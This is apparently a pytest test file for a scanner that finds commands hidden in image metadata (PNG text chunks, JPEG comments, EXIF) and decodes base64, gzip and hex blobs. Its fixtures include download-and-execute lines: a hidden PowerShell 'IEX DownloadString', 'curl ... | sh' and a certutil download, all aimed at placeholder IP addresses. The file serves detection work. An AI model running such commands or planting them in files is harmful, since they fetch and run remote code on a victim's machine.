"""Metadata steganography: commands / scripts hidden in EXIF, PNG text, JPEG comments are listed, decoded and flagged."""
import base64
import gzip

import pytest
from PIL import Image, PngImagePlugin

import filescan
import stegometa

CMD = "powershell -nop -w hidden -c \"IEX (New-Object Net.WebClient).DownloadString('http://203.0.113.5/s.ps1')\""


def _scan(path, kind):
    return filescan.analyze(filescan.AnalyzeIn(path=str(path), name=path.name, size=path.stat().st_size, sha256="", kind=kind, allow_vt=False))


def _img():
    return Image.new("RGB", (48, 48), (180, 40, 40))


def test_base64_command_in_a_png_text_chunk_is_decoded_and_shown(tmp_path):
    info = PngImagePlugin.PngInfo()
    info.add_text("Comment", base64.b64encode((CMD * 2).encode()).decode())
    info.add_text("Software", "Paint 1.0")
    p = tmp_path / "a.png"
    _img().save(p, pnginfo=info)
    r = _scan(p, "png")
    ids = {f["id"] for f in r["findings"]}
    assert {"stego-metadata", "dl-exec-ps"} <= ids
    h = [x for x in r["hidden"] if "metadata" in x["where"]]
    assert h and "DownloadString" in h[0]["text"] and h[0]["kind"] == "script"      # the person sees WHAT is hidden, not just that something is
    assert r["metadata"]["groups"]["PNG"]["Software"] == "Paint 1.0"                  # and the ordinary fields are listed like exiftool does


def test_gzip_base64_and_hex_blobs_are_opened():
    blob = base64.b64encode(gzip.compress(CMD.encode() * 2)).decode()
    assert stegometa.inspect_field("PNG", "Comment", blob)["kind"] == "script"
    assert stegometa.inspect_field("EXIF", "Make", (b"MZ" + b"\x90" * 200).hex())["kind"] == "pe"
    assert stegometa.inspect_field("EXIF", "Make", base64.b64encode(b"MZ" + b"\x00" * 200).decode())["kind"] == "pe"


def test_jpeg_comment_and_exif_comment_are_found(tmp_path):
    p = tmp_path / "b.jpg"
    _img().save(p, comment=b"curl http://198.51.100.7/x.sh | sh")
    r = _scan(p, "jpeg")
    assert any(f["id"] == "stego-metadata" for f in r["findings"]) and any("JPEG metadata" in h["where"] for h in r["hidden"])
    ex = Image.Exif()
    ex[0x9286] = b"ASCII\x00\x00\x00cmd.exe /c certutil -urlcache -f http://1.2.3.4/p.exe p.exe"
    q = tmp_path / "c.jpg"
    _img().save(q, exif=ex)
    assert any(h["where"].startswith("EXIF metadata") for h in _scan(q, "jpeg")["hidden"])


def test_ordinary_photo_metadata_is_not_flagged(tmp_path):
    ex = Image.Exif()
    ex[0x010F], ex[0x0110], ex[0x010E] = "Canon", "EOS 5D", "Family trip to Hunza, summer 2024"
    p = tmp_path / "ok.jpg"
    _img().save(p, exif=ex)
    r = _scan(p, "jpeg")
    assert r["metadata"]["fields"] >= 3 and not r["hidden"] and not any(f["id"] == "stego-metadata" for f in r["findings"])


def test_private_png_chunk_is_listed(tmp_path):
    import struct
    import zlib
    p = tmp_path / "d.png"
    _img().save(p)
    data = p.read_bytes()
    payload = b"hidden payload here"
    chunk = struct.pack(">I", len(payload)) + b"prVt" + payload + struct.pack(">I", zlib.crc32(b"prVt" + payload))
    iend = data.rindex(b"IEND") - 4
    p.write_bytes(data[:iend] + chunk + data[iend:])
    assert "Private chunk prVt" in _scan(p, "png")["metadata"]["groups"]["PNG"]
